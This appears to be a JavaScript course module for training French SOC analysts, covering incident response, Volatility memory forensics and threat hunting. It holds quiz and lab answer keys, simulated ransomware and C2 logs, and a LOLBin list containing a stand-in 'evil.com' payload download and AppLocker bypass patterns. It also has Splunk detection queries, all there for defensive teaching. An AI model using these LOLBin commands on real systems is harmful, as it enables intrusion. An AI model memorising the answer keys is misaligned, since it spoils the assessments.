const niveau3 = {
  id: 3,
  name: 'Analyste SOC Confirmé',
  badge: '⚔️',
  duration: 120,
  certifications: ['CompTIA CySA+', 'GIAC GCIA', 'GIAC GCFE'],
  description: 'Incident Response, Digital Forensics, Malware Analysis, Threat Hunting, IDS/IPS avancé. Niveau BAC+4.',
  modules: [
    {
      id: 'n3-m1',
      title: 'Incident Response',
      lessons: [
        {
          id: 'n3-m1-l1',
          title: 'Incident Response — Méthodologie PICERL',
          description: 'Maîtriser la méthodologie de réponse aux incidents en 6 phases : Préparation, Identification, Confinement, Éradication, Récupération, Leçons.',
          duration: 65,
          xpReward: 180,
          hasQuiz: true,
          hasLab: true,
          objectives: [
            'Maîtriser les 6 phases de l\'Incident Response (PICERL)',
            'Comprendre comment prioriser et classifier les incidents',
            'Savoir décider quand confiner et comment',
            'Produire une documentation d\'incident professionnelle',
          ],
          theory: `# Incident Response — Méthodologie PICERL

## Qu\'est-ce que l\'Incident Response ?

L\'Incident Response (IR) est le processus **structuré** de gestion des incidents de cybersécurité. L\'objectif : **minimiser l\'impact, restaurer les opérations et apprendre de l\'incident**.

## Les 6 Phases — PICERL

### Phase 1 — Préparation (Preparation)

**Avant** l\'incident. La phase la plus importante.

\`\`\`
Éléments de préparation :
✓ Plan de réponse aux incidents (PSSI)
✓ Équipe IR désignée (CSIRT)
✓ Outils déployés (SIEM, EDR, forensics)
✓ Playbooks documentés
✓ Contacts d\'urgence (CERT-FR, prestataires)
✓ Environnements de test isolés
✓ Sauvegardes testées et fonctionnelles
\`\`\`

### Phase 2 — Identification (Identification)

**Détecter** et **confirmer** qu\'un incident a bien lieu.

\`\`\`
Sources de détection :
• Alertes SIEM
• Alertes EDR
• Rapport utilisateur ("mon PC est lent")
• Notification externe (CERT, partenaire)
• Détection anti-virus

Questions à répondre :
• Qu\'est-ce qui s\'est passé ?
• Quand cela a-t-il commencé ?
• Quels systèmes sont affectés ?
• Quel est l\'impact actuel ?
• S\'agit-il d\'un faux positif ?
\`\`\`

**Classification de la sévérité :**

| Niveau | Critères | Exemple |
|--------|---------|---------|
| P1 — Critique | Infrastructure critique touchée | Ransomware sur DC |
| P2 — Élevé | Données sensibles exposées | Exfiltration client |
| P3 — Moyen | Système compromis isolé | Poste utilisateur infecté |
| P4 — Faible | Tentative sans succès | Brute force bloqué |

### Phase 3 — Confinement (Containment)

**Stopper la propagation** sans détruire de preuves.

#### Confinement à court terme
\`\`\`
Actions immédiates :
• Isoler le système compromis du réseau (maintenir allumé !)
• Bloquer l\'IP attaquante sur le firewall
• Désactiver le compte compromis (NE PAS changer le mdp)
• Capturer la mémoire RAM (image mémoire)
• Prendre un snapshot VM si possible
\`\`\`

> ⚠️ **IMPORTANT** : Ne pas éteindre le système immédiatement — vous perdriez les données en mémoire (processus, connexions réseau, chiffrement).

#### Confinement à long terme
\`\`\`
• Patcher la vulnérabilité exploitée
• Changer les credentials sur les systèmes adjacents
• Renforcer les règles firewall
• Déployer des IOC dans le SIEM
\`\`\`

### Phase 4 — Éradication (Eradication)

**Éliminer** la cause racine et les traces de l\'attaquant.

\`\`\`
Actions :
• Identifier et supprimer les malwares
• Fermer les backdoors
• Révoquer les comptes/credentials compromis
• Supprimer les clés de registre de persistance
• Patcher les CVEs exploitées
• Vérifier les autres systèmes (propagation ?)
\`\`\`

### Phase 5 — Récupération (Recovery)

**Remettre en service** de façon sécurisée.

\`\`\`
Étapes :
1. Restauration depuis sauvegarde propre (si nécessaire)
2. Réinstallation du système (si compromis profondément)
3. Tests de fonctionnement
4. Surveillance renforcée pendant 30 jours
5. Validation avant retour en production
\`\`\`

### Phase 6 — Leçons apprises (Lessons Learned)

**Améliorer** le process pour les prochains incidents.

\`\`\`
Réunion post-mortem dans les 2 semaines :
• Chronologie complète de l\'incident
• Comment a-t-on détecté ?
• Quelle a été la réponse ?
• Qu\'est-ce qui a bien fonctionné ?
• Qu\'est-ce qui doit être amélioré ?
• Actions correctives avec responsables et délais
\`\`\`

---

## Documentation d\'un Incident

### Fiche d\'incident (Incident Ticket)

\`\`\`
ID          : INC-2026-0512
Date/Heure  : 2026-05-25 03:22:00
Type        : Ransomware
Sévérité    : P1 — Critique
Analyste    : Jean Dupont
Statut      : En cours

DESCRIPTION :
Chiffrement de fichiers détecté sur FILESERVER01.
Extension .locked sur tous les partages réseau.
Utilisateur jsmith connecté 30 minutes avant.

TIMELINE :
03:22 — Alerte SIEM (volume de modifications fichiers anormal)
03:25 — Confirmation ransomware (note de rançon trouvée)
03:30 — Isolation de FILESERVER01
03:45 — Analyse RAM capturée
04:00 — Blocage de l\'IP C2 sur firewall

SYSTÈMES IMPACTÉS :
• FILESERVER01 (chiffré)
• WORKSTATION-JSMITH (point d\'entrée)

INDICATORS OF COMPROMISE :
• SHA256 : 5e884898da280...
• C2 : 185.220.101.45
• Note : !README_DECRYPT.txt

ACTIONS EN COURS :
• Analyse forensique WORKSTATION-JSMITH
• Vérification des sauvegardes
• Investigation point d\'entrée
\`\`\``,
          quiz: [
            {
              id: 'n3-m1-l1-q1',
              xpReward: 80,
              question: 'Pourquoi NE PAS éteindre immédiatement un système compromis lors du confinement ?',
              options: [
                'Pour maintenir les services disponibles',
                'Pour préserver les données en RAM (processus, connexions, chiffrement) essentielles à l\'investigation',
                'Pour éviter de déclencher une alerte sur le SIEM',
                'Pour permettre à l\'antivirus de terminer son analyse',
              ],
              correct: 1,
              explanation: 'Éteindre un système compromis **détruit les données en mémoire vive (RAM)** : processus malveillants en cours, connexions réseau actives, clés de chiffrement (cruciales pour les ransomwares). Il faut d\'abord faire une **image mémoire (dump RAM)** avant tout.',
            },
            {
              id: 'n3-m1-l1-q2',
              xpReward: 80,
              question: 'Dans quelle phase de PICERL produit-on un rapport post-mortem et les leçons apprises ?',
              options: ['Confinement', 'Éradication', 'Récupération', 'Lessons Learned (Post-incident)'],
              correct: 3,
              explanation: 'La phase **Lessons Learned (Leçons apprises)** est la dernière phase de PICERL. Elle consiste à analyser l\'incident après résolution : chronologie, ce qui a fonctionné, ce qui doit être amélioré, et les actions correctives à mettre en place.',
            },
            {
              id: 'n3-m1-l1-q3',
              xpReward: 80,
              question: 'Un ransomware a chiffré les partages réseau. Quelle est la PREMIÈRE action à prendre ?',
              options: [
                'Payer la rançon pour récupérer les fichiers',
                'Éteindre tous les serveurs immédiatement',
                'Isoler les systèmes compromis du réseau TOUT EN les laissant allumés',
                'Réinstaller Windows sur les postes affectés',
              ],
              correct: 2,
              explanation: 'La première action est le **confinement** : **isoler les systèmes** (déconnecter du réseau) pour stopper la propagation, mais **les laisser allumés** pour préserver les preuves en RAM. Éteindre = perte des preuves et potentiellement des clés de déchiffrement.',
            },
          ],
          lab: {
            id: 'lab-n3-m1-l1',
            title: 'Simulation IR — Incident Ransomware',
            description: 'Vous êtes analyste SOC Tier 2. Une alerte P1 vient d\'arriver : possible ransomware en cours. Suivez la méthodologie PICERL pour gérer l\'incident.',
            xpReward: 400,
            files: {
              'alert.txt': `[ALERTE P1] 2026-05-25 03:22:00
Source : SIEM - Splunk
Règle : Mass File Modification Detected
Host : FILESERVER01.corp.local
User : jsmith (connecté depuis 03:00)
Détail : 15,847 fichiers modifiés en 22 minutes
Extension observée : .locked
Processus suspect : svchost.exe (PID 4892) depuis C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.exe`,
              'network_logs.txt': `[03:00:15] jsmith logged in FILESERVER01 from WORKSTATION-JSMITH (192.168.1.150)
[03:01:00] DNS query: evil-ransomware-c2.onion.ly → 45.33.32.156
[03:01:05] HTTP POST FILESERVER01 → 45.33.32.156:443 (TLS) 1.2KB sent
[03:01:06] HTTP GET 45.33.32.156 → FILESERVER01 payload.enc 2.3MB received
[03:01:30] HTTP POST FILESERVER01 → 45.33.32.156 (progressif - exfiltration)
[03:22:00] 45.33.32.156 → FILESERVER01 (C2 communication active)`,
              'system_events.txt': `[03:00:15] EventID=4624 user=jsmith WORKSTATION-JSMITH → FILESERVER01
[03:01:00] EventID=4688 process=update.exe parent=cmd.exe user=jsmith path=C:\\Users\\jsmith\\AppData\\Local\\Temp\\
[03:01:05] EventID=7045 service=WindowsUpdate_svc path=C:\\Windows\\Temp\\svc.exe
[03:22:00] Note de rançon créée: \\\\FILESERVER01\\Shares\\!README_DECRYPT.txt`,
            },
            commands: {
              'cat alert.txt': `[ALERTE P1] 2026-05-25 03:22:00
Source : SIEM - Splunk
Règle : Mass File Modification Detected
Host : FILESERVER01.corp.local
User : jsmith (connecté depuis 03:00)`,
            },
            questions: [
              {
                id: 'lab-ir1',
                text: 'Quel système est le point d\'entrée initial du ransomware (poste de travail de l\'attaquant) ?',
                answer: 'WORKSTATION-JSMITH',
                answerAlt: ['workstation-jsmith', '192.168.1.150'],
                placeholder: 'Nom du système',
              },
              {
                id: 'lab-ir2',
                text: 'Quelle IP est le serveur C2 (Command & Control) du ransomware ?',
                answer: '45.33.32.156',
                placeholder: 'X.X.X.X',
              },
              {
                id: 'lab-ir3',
                text: 'Quelle est la première phase PICERL applicable maintenant que l\'incident est confirmé ?',
                answer: 'Confinement',
                answerAlt: ['confinement', 'containment', 'Containment'],
                placeholder: 'Nom de la phase',
              },
            ],
            hints: [
              'Le poste de travail de jsmith est la source initiale — regardez les network_logs.',
              'L\'IP C2 est celle qui reçoit des données du serveur compromis via HTTP POST.',
              'Après l\'identification de l\'incident, la prochaine étape PICERL est le confinement.',
            ],
          },
        },
      ],
    },
    {
      id: 'n3-m2',
      title: 'Digital Forensics',
      lessons: [
        {
          id: 'n3-m2-l1',
          title: 'Forensics Numérique — Analyse de la Mémoire RAM',
          description: 'Apprendre à analyser une image mémoire avec Volatility pour retrouver des processus cachés, des connexions réseau et des malwares en mémoire.',
          duration: 75,
          xpReward: 200,
          hasQuiz: true,
          hasLab: true,
          objectives: [
            'Comprendre pourquoi la mémoire RAM est cruciale en forensics',
            'Maîtriser les commandes Volatility essentielles',
            'Identifier des processus malveillants en mémoire',
            'Extraire des artefacts utiles (connexions, strings, fichiers)',
          ],
          theory: `# Forensics — Analyse de la Mémoire RAM

## Pourquoi analyser la RAM ?

La mémoire vive contient des informations **volatiles** qui disparaissent à l\'extinction :
- **Processus actifs** (y compris malwares invisibles sur disque)
- **Connexions réseau** ouvertes
- **Clés de chiffrement** en clair
- **Credentials** (mots de passe, hashes)
- **Commandes exécutées** récemment
- **DLLs injectées** dans des processus légitimes

---

## Acquisition de la Mémoire

\`\`\`bash
# Windows — Outils d\'acquisition
winpmem.exe memory.dmp        # WinPmem (gratuit)
FTK Imager → File → Capture Memory

# Linux
dd if=/dev/mem of=memory.dmp
LiME (Linux Memory Extractor) — module kernel
\`\`\`

---

## Volatility — L\'outil de référence

Volatility est l\'outil open source de référence pour l\'analyse de mémoire.

### Identifier le profil (OS)

\`\`\`bash
volatility -f memory.dmp imageinfo
# Output : Suggested Profile: Win10x64_19041

# Volatility 3 (plus récent, pas besoin de profil)
vol3 -f memory.dmp windows.info
\`\`\`

### Lister les processus

\`\`\`bash
# Processus actifs (comme le Task Manager)
volatility -f memory.dmp --profile=Win10x64 pslist

# Arborescence des processus (parent → enfant)
volatility -f memory.dmp --profile=Win10x64 pstree

# Détecter les processus cachés (différence pslist vs psscan)
volatility -f memory.dmp --profile=Win10x64 psscan

# Processus avec mauvais parent (signe de process injection)
volatility -f memory.dmp --profile=Win10x64 cmdline
\`\`\`

### Connexions réseau

\`\`\`bash
# Connexions actives et récentes
volatility -f memory.dmp --profile=Win10x64 netstat
# ou
volatility -f memory.dmp --profile=Win10x64 netscan

# Output type :
# Proto  Local         Foreign       State   PID    Process
# TCP    192.168.1.10  45.33.32.156  ESTABLISHED  4892  svchost.exe
\`\`\`

### Injection de code (DLL injection)

\`\`\`bash
# Lister les DLLs chargées par processus
volatility -f memory.dmp --profile=Win10x64 dlllist -p 4892

# Détecter les DLLs suspectes
volatility -f memory.dmp --profile=Win10x64 malfind
# malfind = sections mémoire avec flags exécutable + contenu non mappé = injection
\`\`\`

### Extraire des chaînes (strings)

\`\`\`bash
# Extraire les strings d\'un processus spécifique
volatility -f memory.dmp --profile=Win10x64 strings -p 4892
\`\`\`

### Registry en mémoire

\`\`\`bash
# Lister les hives chargées
volatility -f memory.dmp --profile=Win10x64 hivelist

# Lire une clé de registre en mémoire
volatility -f memory.dmp --profile=Win10x64 printkey -o 0x... -K "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
\`\`\`

---

## Workflow d\'Analyse Mémoire SOC

\`\`\`
1. imageinfo          → Identifier l\'OS
2. pslist / pstree    → Trouver des processus suspects
3. psscan             → Détecter les processus cachés
4. cmdline            → Voir les commandes exécutées
5. netscan            → Connexions réseau actives
6. malfind            → Injection de code détectée
7. dlllist -p PID     → DLLs du processus suspect
8. strings -p PID     → Strings utiles (C2, clés)
9. dumpfiles / procdump → Extraire le binaire pour analyse
\`\`\`

---

## Signes d\'Alerte en Analyse Mémoire

| Observation | Signification |
|-------------|--------------|
| cmd.exe lancé par svchost.exe | Injection de code |
| svchost.exe sans parent services.exe | Process masquerading |
| Connexion réseau depuis notepad.exe | Malware injecté |
| malfind avec MZ header | PE injecté en mémoire |
| Processus sans DLLs standard | Process hollowing |`,
          quiz: [
            {
              id: 'n3-m2-l1-q1',
              xpReward: 80,
              question: 'Quelle commande Volatility permet de détecter des processus cachés que pslist ne voit pas ?',
              options: ['pstree', 'psscan', 'cmdline', 'netscan'],
              correct: 1,
              explanation: '**psscan** scanne la mémoire physique pour trouver tous les processus, y compris ceux que des rootkits ont cachés de pslist (qui utilise la liste de processus du système). La différence entre psscan et pslist peut révéler des processus malveillants.',
            },
            {
              id: 'n3-m2-l1-q2',
              xpReward: 80,
              question: 'La commande "malfind" de Volatility détecte quoi exactement ?',
              options: [
                'Les fichiers malveillants sur le disque',
                'Les sections mémoire exécutables avec du code injecté non mappé à un fichier',
                'Les connexions réseau suspectes',
                'Les clés de registre de persistance',
              ],
              correct: 1,
              explanation: '**malfind** cherche des **sections mémoire marquées comme exécutables** mais qui ne correspondent à aucun fichier mappé sur le disque (signe typique de **process injection / process hollowing**). Il affiche souvent le header MZ (début d\'un PE/exécutable) injecté.',
            },
          ],
          lab: {
            id: 'lab-n3-m2-l1',
            title: 'Analyse mémoire simulée — Détection de malware',
            description: 'Analysez la sortie simulée de commandes Volatility pour identifier un processus malveillant et ses indicateurs.',
            xpReward: 400,
            files: {
              'pslist_output.txt': `Volatility Foundation Volatility Framework 2.6
Offset(V)   Name                    PID    PPID   Thds   Hnds   Start
0x....      System                  4      0      93     2191   2026-05-25
0x....      smss.exe                296    4      3      29     2026-05-25
0x....      csrss.exe               432    424    11     581    2026-05-25
0x....      wininit.exe             476    424    3      75     2026-05-25
0x....      services.exe            568    476    11     372    2026-05-25
0x....      lsass.exe               576    476    9      769    2026-05-25
0x....      svchost.exe             768    568    38     1290   2026-05-25
0x....      svchost.exe             840    568    25     547    2026-05-25
0x....      explorer.exe            2340   1236   63     1893   2026-05-25
0x....      cmd.exe                 4892   2340   1      43     2026-05-25 03:01:00
0x....      svchost.exe             4920   4892   5      82     2026-05-25 03:01:05
0x....      update.exe              5012   4892   8      124    2026-05-25 03:01:10  C:\\Users\\jsmith\\AppData\\Local\\Temp\\`,
              'netscan_output.txt': `Volatility Foundation Volatility Framework 2.6
Proto  Local Address             Foreign Address           State   PID    Process
TCP    192.168.1.10:49876        45.33.32.156:443          ESTABLISHED  5012   update.exe
TCP    192.168.1.10:49877        45.33.32.156:443          ESTABLISHED  5012   update.exe
UDP    0.0.0.0:5355             *:*                                    1024   svchost.exe`,
              'cmdline_output.txt': `Volatility Foundation Volatility Framework 2.6
cmd.exe (4892)
Command line: cmd.exe /c "C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.exe -silent -c2 45.33.32.156 -k AES256_KEY_HERE"

update.exe (5012)
Command line: update.exe -silent -c2 45.33.32.156 -k AES256_KEY_HERE -encrypt \\\\FILESERVER01\\Shares\\`,
            },
            commands: {},
            questions: [
              {
                id: 'lab-mem1',
                text: 'Quel est le PID du processus malveillant "update.exe" ?',
                answer: '5012',
                placeholder: 'Numéro PID',
              },
              {
                id: 'lab-mem2',
                text: 'Depuis quel répertoire s\'exécute le malware update.exe ? (répondre avec le dossier, sans le nom du fichier)',
                answer: 'C:\\Users\\jsmith\\AppData\\Local\\Temp',
                answerAlt: ['AppData\\Local\\Temp', 'Temp', 'AppData/Local/Temp'],
                placeholder: 'Chemin du répertoire',
              },
              {
                id: 'lab-mem3',
                text: 'Quel est le processus parent de update.exe ? (signe d\'une injection depuis un processus légitime)',
                answer: 'cmd.exe',
                placeholder: 'Nom du processus parent',
              },
            ],
            hints: [
              'Cherchez update.exe dans pslist_output.txt pour trouver son PID.',
              'Le chemin d\'exécution est visible dans cmdline_output.txt.',
              'Le PPID de update.exe correspond au PID de cmd.exe dans pslist.',
            ],
          },
        },
      ],
    },
    {
      id: 'n3-m3',
      title: 'Threat Hunting',
      lessons: [
        {
          id: 'n3-m3-l1',
          title: 'Threat Hunting — Méthodologie et Hypothèses',
          description: 'Apprendre à chasser proactivement les menaces dans l\'infrastructure sans se baser uniquement sur les alertes automatiques.',
          duration: 70,
          xpReward: 190,
          hasQuiz: true,
          hasLab: false,
          objectives: [
            'Comprendre la différence entre IR réactif et Threat Hunting proactif',
            'Maîtriser la méthodologie en 5 étapes',
            'Créer des hypothèses de chasse basées sur ATT&CK',
            'Utiliser Sysmon, SIEM et EDR pour chasser',
          ],
          theory: `# Threat Hunting — Chasse aux Menaces

## Threat Hunting vs Incident Response

| Aspect | Incident Response | Threat Hunting |
|--------|-----------------|---------------|
| Déclencheur | Alerte du SIEM | Proactif, pas d\'alerte |
| Mode | Réactif | Proactif |
| Objectif | Gérer l\'incident | Trouver des menaces inconnues |
| Délai | Immédiat | Jours/semaines |
| Résultat | Résolution incident | Nouvelles règles de détection |

## Pourquoi Chasser ?

- Les attaquants APT restent en moyenne **200 jours** avant d\'être détectés
- Les alertes SIEM ne détectent que les **menaces connues**
- Un hunter découvre ce que les outils automatiques ratent

---

## Méthodologie en 5 Étapes

### 1. Hypothèse

Basez-vous sur la Threat Intelligence et ATT&CK.

\`\`\`
Exemple d\'hypothèse :
"Je suspecte qu\'un acteur utilise du Living-off-the-Land (LOLBins)
pour établir de la persistance via des tâches planifiées cachées."

Source : Rapport CISA sur APT29, technique T1053 (Scheduled Tasks)
\`\`\`

### 2. Collecte des données

Identifiez les sources de données nécessaires pour tester l\'hypothèse.

\`\`\`
Pour tester les tâches planifiées suspectes :
• Windows Event Log 4698 (tâche créée)
• Windows Event Log 4702 (tâche modifiée)
• Sysmon Event ID 1 (process create) — schtasks.exe
• EDR : exécutions de schtasks.exe
\`\`\`

### 3. Chasse (Hunt)

Exécutez les requêtes.

\`\`\`spl
Splunk :
index=windows EventCode=4698 earliest=-30d
| stats count by host, TaskName, Command
| where match(Command, "powershell|cmd|base64|http|download")
| sort -count

Elastic KQL :
event.code: 4698 AND (process.command_line:*powershell* OR process.command_line:*http*)
\`\`\`

### 4. Investigation

Vérifiez les résultats.

\`\`\`
Pour chaque tâche suspecte :
• Qui l\'a créée (utilisateur, heure) ?
• Quelle commande exécute-t-elle ?
• Est-ce une tâche légitime ou suspecte ?
• Contexte : d\'autres activités de cet utilisateur ce jour-là ?
\`\`\`

### 5. Réponse et Documentation

\`\`\`
Si menace trouvée → Escalade IR
Résultats documentés → Nouvelle règle SIEM
\`\`\`

---

## Hypothèses de Chasse Courantes

### Chasse aux LOLBins
Outils Windows légitimes utilisés par des attaquants.

\`\`\`
Cibles courantes :
• certutil.exe -decode (télécharger des fichiers)
• mshta.exe (exécuter HTA malveillant)
• regsvr32.exe /u /s /i:url.dll (bypasser AppLocker)
• powershell -enc <base64> (commandes encodées)
• wmic process call create cmd.exe (exécution WMI)
• msiexec /i http://evil.com/payload.msi
\`\`\`

**Requête Splunk** :
\`\`\`spl
index=windows EventCode=4688 earliest=-7d
| search (certutil OR mshta OR regsvr32 OR wscript) AND (http OR download OR encode)
| table _time, host, user, CommandLine
\`\`\`

### Chasse au C2 via DNS
\`\`\`spl
index=dns earliest=-24h
| eval query_len=len(query)
| stats avg(query_len) as avg_len, count by domain
| where avg_len > 50 AND count > 100
| sort -avg_len
\`\`\`

### Chasse au Lateral Movement (PsExec)
\`\`\`spl
index=windows EventCode=7045 earliest=-7d
| search ServiceName=PSEXESVC OR CommandLine="psexec"
| table _time, host, user, ServiceName, CommandLine
\`\`\``,
          quiz: [
            {
              id: 'n3-m3-l1-q1',
              xpReward: 80,
              question: 'Qu\'est-ce qu\'un "Living-off-the-Land" (LOLBin) attack ?',
              options: [
                'Une attaque qui utilise des outils spéciaux téléchargés depuis Internet',
                'Une attaque qui utilise des outils légitimes Windows (certutil, mshta, powershell) pour éviter la détection',
                'Une attaque qui cible les serveurs de fermes (agriculture) en IoT',
                'Une attaque qui se base sur des vulnérabilités zero-day',
              ],
              correct: 1,
              explanation: '**Living-off-the-Land** (LoL) désigne l\'utilisation d\'**outils légitimes du système** (certutil, mshta, wmic, powershell) par les attaquants pour leurs actions malveillantes. Ces outils sont "de confiance" et souvent ignorés par les antivirus — d\'où l\'intérêt du Threat Hunting.',
            },
            {
              id: 'n3-m3-l1-q2',
              xpReward: 80,
              question: 'Quelle est la première étape de la méthodologie de Threat Hunting ?',
              options: ['Collecter toutes les données du SIEM', 'Formuler une hypothèse basée sur la Threat Intelligence', 'Bloquer les IPs suspectes', 'Escalader au Tier 3'],
              correct: 1,
              explanation: 'La première étape du Threat Hunting est de **formuler une hypothèse** basée sur la Threat Intelligence, les rapports ATT&CK, ou les tendances d\'attaque actuelles. Sans hypothèse, la chasse est sans direction et inefficace.',
            },
          ],
        },
      ],
    },
  ],
}

export default niveau3
